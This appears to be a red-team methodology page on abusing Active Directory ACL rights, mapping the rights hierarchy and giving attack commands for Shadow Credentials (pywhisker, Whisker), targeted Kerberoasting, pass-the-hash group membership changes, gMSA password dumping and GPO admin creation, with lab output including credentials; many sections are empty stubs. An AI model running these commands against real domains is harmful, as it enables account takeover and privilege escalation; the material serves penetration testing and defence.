<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# AD ACL
## Tags
<details><summary>Tags (Click to expand)</summary><p>

Environment

		#@active #@directory #@activedirectory #@microsoft

Context

		#@GPO #@Kerberoast #@AllExtendedRights #@logon #@logonscript

Tools

		#@pywhisker #@targetedkerberoast.py #@targetedkerberoast #@pygpoabuse #@pygpoabuse.py

</p></details>

## Resources
* <details><summary>Resources (Click to expand)</summary><p>
	* Andy Robbins and Will Schroeder, Blackhat 2017: "An ACE Up the Sleeve: Designing Active Directory DACL Backdoors" -[https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf](https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf)

## Tools

## Overview

Some TTPs are relevant across multiple tools and may be present  simultaneously:

* [`Account Manipulation` TTP](TTP/T1098_Account_Manipulation/T1098.md)

## AD Rights Hierarchy

**The Hacker Recipes Image Guide to ACL Rights**

<img src="https://3210236927-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MHRw3PMJtbDDjbxm5ub%2Fuploads%2FkEwZ5iNqinnw47Ss0JvB%2FDACL%20abuse.png?alt=media&token=6dda6a47-40b6-4cef-b86f-19174817434f" style="float": left; width="500" />

* <details><summary>AD Rights Hierarchy (Click to expand)</summary><p>
	* GenericAll (`ADS_RIGHT_GENERIC_ALL`)
		* GenericWrite (`ADS_RIGHT_GENERIC_WRITE`)
			* Self (`ADS_RIGHT_DS_SELF`)
			* WriteProperty (`ADS_RIGHT_DS_WRITE_PROP`)
				* Shadow Credentials
				* Kerberos RBCD
				* Logon Script
				* Targeted Kerberoasting
				* Evil GPOs (such as immediate scheduled task)
				* Add Member
		* AllExtendedRights (`ADS_RIGHT_DS_CONTROL_ACCESS`)
			* AddMember
			* ReadLAPSPassword
			* ReadGMSAPassword
			* User-Force-Change-Password (ForceChangePassword)
			* DCSync Rights (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, DS-Replication-Get-Changes-In-Filtered-Set)
				* May have both `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`, but not just one for DCSync privileges
				* DCSync
					* Impacket `secretsdump.py`
					* Mimikatz
		* WriteOwner (`ADS_RIGHT_WRITE_OWNER`)
			* ANY
				* Grant ownership
					* Own object
						* WriteDacl `ADS_RIGHT_WRITE_DAC`
							* ANY
								* Grant rights
									* GenericAll

## Exploitation
### From a Linux Machine
* Shadow Credentials
	* <details><summary>Requirements (Click to expand)</summary><p>
		* Domain Functional level of 2016+
	* <details><summary>Resources (Click to expand)</summary><p>
		* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels)
	* <details><summary>Requirements, Notes (Click to expand)</summary><p>
		* Only computer objects can edit their own `msDS-KeyCredentialLink` attribute.
			* This means the following scenario could work:
				* **Trigger an NTLM auth** from DC01, **relay it** to DC02, make pywhisker edit DC01's attribute to create a Kerberos PKINIT pre-authentication backdoor on it, and have persistent access to DC01 with PKINIT and `pass-the-cache`
			* Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists.
	* <details><summary>General Process (Click to expand)</summary><p>
		1. Create an RSA key pair
		1. Create an X509 certificate configured with the public key
		1. Create a key-credential structure featuring the raw public key and add it to the msDs-KeyCredentialLink attribute
		1. Authenticate using PKINIT and the certificate and private key
	* <details><summary>Recommended: pywhisker.py -<br />[https://github.com/ShutdownRepo/pywhisker](https://github.com/ShutdownRepo/pywhisker) (Click to expand)</summary><p>
		* Requirements
			* Domain Functional Level must be Windows Server 2016 or above.
			* At least one Domain Controller running Windows Server 2016 or above.
			the Domain Controller to use during the attack must have its own certificate and keys (this means either the organization must have AD CS, * or a PKI, a CA or something alike).
			* the attacker must have control over an account able to write the msDs-KeyCredentialLink attribute of the target user or computer account.
		* Guiding Images
			* <img src="https://raw.githubusercontent.com/ShutdownRepo/pywhisker/main/.assets/list_info.png" style="float: left; margin-right: 10px;" />
			* ![https://raw.githubusercontent.com/ShutdownRepo/pywhisker/main/.assets/add_pfx.png](https://raw.githubusercontent.com/ShutdownRepo/pywhisker/main/.assets/add_pfx.png)
			* [https://raw.githubusercontent.com/ShutdownRepo/pywhisker/main/.assets/list_info.png]
		* Process
			1. List current assigned keys

					python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
				* Output

						(pywhisker-fXQhqWaN) root@ubuntu:~/Tools/pywhisker# python pywhisker.py -t shadow_cred --use-ldaps -d securelab -u domain_admin -p P@ssw0rd -v --dc-ip 10.0.0.1 -a list
						[*] Searching for the target account
						[*] Target user found: CN=shadow_cred,CN=Users,DC=securelab,DC=local
						[*] Listing devices for shadow_cred
						[*] DeviceID: 385816db-7bd6-ce25-0044-740ffc119c7f | Creation Time (UTC): 2021-11-13 21:00:00.368135
			1. Optional: Review information on any discovered keys (possible it doesn't have any)

					python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "info" --device-id 6419739b-ff90-f5c7-0737-1331daeb7db6
				* Output

					(pywhisker-fXQhqWaN) root@ubuntu:~/Tools/pywhisker# python pywhisker.py -t shadow_cred --use-ldaps -d securelab -u domain_admin -p P@ssw0rd -v --dc-ip 10.0.0.1 -a info -D 385816db-7bd6-ce25-0044-740ffc119c7f
					[*] Searching for the target account
					[*] Target user found: CN=shadow_cred,CN=Users,DC=securelab,DC=local
					[+] Found device Id
					<KeyCredential structure at 0x7fe6919281c0>
					  | Owner: CN=shadow_cred,CN=Users,DC=securelab,DC=local
					  | Version: 0x200
					  | KeyID: 1Z/eaGwPz7giJoJmZZXrhkYfaYcJmmhGqO7unz4UGRw=
					  | KeyHash: dd6a514e8118481ca451850ba2957f7a261ba6d13aae95b87b0bbdd6b6cd830a
					  | RawKeyMaterial: <dsinternals.common.cryptography.RSAKeyMaterial.RSAKeyMaterial object at 0x7fe6918f5f40>
					  |  | Exponent (E): 65537
					  |  | Modulus (N): 0xb076336c6575a033114cf7bff213def932890af6b0d42cf0e35ad4db66dcdcd8762f772679ad09dc86f083be97ced2eca4f1c7ff94430df36be0f199594c0f32c54bca9ffa5c263ea925595c086242e29469ee718d04c743c709070d83d78728e247f805cead7d94e6f0c5c718817183d7d00671d1626bad1e3090d96590291c55c4c9b800958ce2cd39c0690c05d622e8a4c1755a50283a22b85ee973a0bfcd1f15e8b589056ec7a3f2784f924db79a00679c6c26ebf30844ca12130a132be7958739e123dc79cdcfa0405615d043d53926d971257a35545c548c9766bcf52fc43ec9c139c7d195a2dac0cee195bb736d9b2e93858d15001ec023b2341ff2d5
					  |  | Prime1 (P): 0x0
					  |  | Prime2 (Q): 0x0
					  | Usage: KeyUsage.NGC
					  | LegacyUsage: None
					  | Source: KeySource.AD
					  | DeviceId: 385816db-7bd6-ce25-0044-740ffc119c7f
					  | CustomKeyInfo: <CustomKeyInformation at 0x7fe691c39d10>
					  |  | Version: 1
					  |  | Flags: KeyFlags.NONE
					  |  | VolumeType: None
					  |  | SupportsNotification: None
					  |  | FekKeyVersion: None
					  |  | Strength: None
					  |  | Reserved: None
					  |  | EncodedExtendedCKI: None
					  | LastLogonTime (UTC): 2021-11-13 21:00:00.368135
					  | CreationTime (UTC): 2021-11-13 21:00:00.368135
			1. Add key

					python pywhisker.py -t shadow_cred --use-ldaps -d securelab -u domain_admin -p P@ssw0rd -v --dc-ip 10.0.0.1 -a add
				* Output

					(pywhisker-fXQhqWaN) root@ubuntu:~/Tools/pywhisker# python pywhisker.py -t shadow_cred --use-ldaps -d securelab -u domain_admin -p P@ssw0rd -v --dc-ip 10.0.0.1 -a add                                                                             
					[*] Searching for the target account                                                                                                                                                                                                               
					[*] Target user found: CN=shadow_cred,CN=Users,DC=securelab,DC=local                                                                                                                                                                               
					[*] Generating certificate                                                                                                                                                                                                                         
					[*] Certificate generated                                                                                                                                                                                                                          
					[*] Generating KeyCredential
					[*] KeyCredential generated with DeviceID: 385816db-7bd6-ce25-0044-740ffc119c7f
					[*] Updating the msDS-KeyCredentialLink attribute of shadow_cred
					[+] Updated the msDS-KeyCredentialLink attribute of the target object
					[VERBOSE] No filename was provided. The certificate(s) will be stored with the filename: NucyXMkT
					[VERBOSE] No pass was provided. The certificate will be stored with the password: Ds9eYDRvKogzZlPYgTcg
					[+] Saved PFX (#PKCS12) certificate & key at path: NucyXMkT.pfx
					[*] Must be used with password: Ds9eYDRvKogzZlPYgTcg
					[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
					[VERBOSE] Run the following command to obtain a TGT
					[VERBOSE] python3 PKINITtools/gettgtpkinit.py -cert-pfx NucyXMkT.pfx -pfx-pass Ds9eYDRvKogzZlPYgTcg securelab/shadow_cred NucyXMkT.ccache
					(pywhisker-fXQhqWaN) root@ubuntu:~/Tools/pywhisker# python pywhisker.py -t shadow_cred --use-ldaps -d securelab -u domain_admin -p P@ssw0rd -v --dc-ip 10.0.0.1 -a list
					[*] Searching for the target account
					[*] Target user found: CN=shadow_cred,CN=Users,DC=securelab,DC=local
					[*] Listing devices for shadow_cred
					[*] DeviceID: 385816db-7bd6-ce25-0044-740ffc119c7f | Creation Time (UTC): 2021-11-13 21:00:00.368135

					* .
				* Optional flags
					* `-P PFX_PASSWORD`, `--pfx-password PFX_PASSWORD`
					* `/`
					* `/`
			1. Remove Key

					python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id a8ce856e-9b58-61f9-8fd3-b079689eb46e
				* Additonal Required flags
					* `-D DEVICE_ID`, `--device-id DEVICE_ID` (detailed in results from LIST action)
* Kerberos RBCD
	* [See the Kerberos Abuse Guide](Testaments_and_Books/Redvelations/Active_Directory/002-2_Kerberos_Abuse.md)
* Logon Script
	* N/A
* Targeted Kerberoasting
	* <details><summary>targetedKerberoast.py (Click to expand)</summary><p>

			targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
		* For each user without SPNs, the tool tries to set one (abuse of a write permission on the servicePrincipalName attribute)
		* print the "kerberoast" hash, and delete the temporary SPN set for that operation
* Add Member
	* <details><summary>Notes (Click to expand)</summary><p>
	* <details><summary>Recommended: (pth-)net rpc group addmem (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
		* Examples
			* With net and cleartext credentials (will be prompted)
			
					net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController
			* With net and cleartext credentials
			
					net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%$Password -S $DomainController
			* With Pass-the-Hash

					pth-net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController
	* Recommended: ntlmrelayx.py
		* <details><summary>References (Click to expand)</summary><p>
		* <details><summary>Process (Click to expand)</summary><p>

				.
* ReadLAPSPassword
	* <details><summary>Notes (Click to expand)</summary><p>
		* ntlmrelayx.py
			* <details><summary>References (Click to expand)</summary><p>
			* <details><summary>Process (Click to expand)</summary><p>

					.
		* crackmapexec
			* <details><summary>References (Click to expand)</summary><p>
			* <details><summary>Process (Click to expand)</summary><p>

					.
* ReadGMSAPassword
	* <details><summary>Notes (Click to expand)</summary><p>
	* <details><summary>gMSADumper.py (Click to expand)</summary><p>
		* Examples

				gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
	* ntlmrelayx.py
		* <details><summary>References (Click to expand)</summary><p>
		* <details><summary>Process (Click to expand)</summary><p>

				.
	* crackmapexec
		* <details><summary>References (Click to expand)</summary><p>
		* <details><summary>Process (Click to expand)</summary><p>

				.
* User-Force-Change-Password (ForceChangePassword)
	* <details><summary>Notes (Click to expand)</summary><p>
	* Recommended: (pth-)net rpc password
		* <details><summary>References (Click to expand)</summary><p>
		* <details><summary>Process (Click to expand)</summary><p>

				.
* DCSync
	* See [Domain Persistence Guide](Testaments_and_Books/Redvelations/Active_Directory/007-0_AD_Domain_Persistence.md)
* Grant Ownership
	* Recommended: N/A
		* <details><summary>References (Click to expand)</summary><p>
		* <details><summary>Process (Click to expand)</summary><p>

				.

### From a Windows Machine

* Shadow Credentials
	* <details><summary>Recommended: whisker -<br />[https://github.com/eladshamir/Whisker](https://github.com/eladshamir/Whisker) (Click to expand)</summary><p>

					Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
* Kerberos RBCD
	* [See the Kerberos Abuse Guide](Testaments_and_Books/Redvelations/Active_Directory/002-2_Kerberos_Abuse.md)
* Logon Script
	* Set-DomainObject
* Targeted Kerberoasting

	* Adding a user to the local admin group
		* Recommended: 
			* <details><summary>References (Click to expand)</summary><p>
			* <details><summary>Process (Click to expand)</summary><p>
				1. Create the user

						Windows search bar > Group Policy Management Editor > Computer configuration > Preferences > Control Panel Settings > Local Users and Groups > Right click on it > New > Local User > Action: Create > User name: <user>
				1. Add the user to the local admin group

						Windows search bar > Group Policy Management Editor > Computer configuration > Preferences > Control Panel Settings > Local Users and Groups > Right click on it > New > Local User > Action: Update > Group name : <Administrators> > Members: Add: <user>
				1. Optional: Force Group Policy Update (Occurs every 90 minutes otherwise)

						gpupdate /force

* Add Member
	* Recommended: Add-DomainGroupMember, net group
		* <details><summary>References (Click to expand)</summary><p>
		* <details><summary>Process (Click to expand)</summary><p>

				.
* ReadLAPSPassword
	* Recommended: Get-ADComputer
		* <details><summary>References (Click to expand)</summary><p>
		* <details><summary>Process (Click to expand)</summary><p>

				.
* ReadGMSAPassword
	* Recommended: Get-ADServiceAccount
		* <details><summary>References (Click to expand)</summary><p>
		* <details><summary>Process (Click to expand)</summary><p>

				.
* User-Force-Change-Password (ForceChangePassword)
	* Recommended: Set-DomainUserPassword
		* <details><summary>References (Click to expand)</summary><p>
		* <details><summary>Process (Click to expand)</summary><p>

				.
* DCSync
	* See [Domain Persistence Guide](Testaments_and_Books/Redvelations/Active_Directory/007-0_AD_Domain_Persistence.md)
* Grant Ownership
	* <details><summary>Recommended: Set-DomainObjectOwner (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
		* <details><summary>Process (Click to expand)</summary><p>

				.
